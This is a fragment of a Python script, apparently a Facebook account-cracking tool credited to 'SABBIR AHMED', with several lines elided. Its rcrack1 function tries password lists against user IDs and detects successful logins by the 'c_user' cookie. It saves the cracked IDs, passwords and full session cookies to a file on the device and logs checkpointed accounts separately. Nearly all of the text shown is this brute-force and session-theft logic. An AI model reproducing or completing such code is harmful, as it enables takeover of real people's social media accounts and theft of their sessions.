...
\033[1;32m═══════════════════════════════════════════════════════════════\033[0m
\033[1;33mTOOL OWNER : SABBIR AHMED
\033[1;33mBROTHERS   : SABBIR × FARHAN
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sSxN\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[SxN-OK] {cid}|{ps}")
                #print('\033[1;91m[033[1;97mCOOKIE-🌺033[1;91m] = 033[1;33m{coki}')
                open('/sdcard/SxN-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[SxN-CP💔] {uid}|{ps}")
                open('/sdcard/SxN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
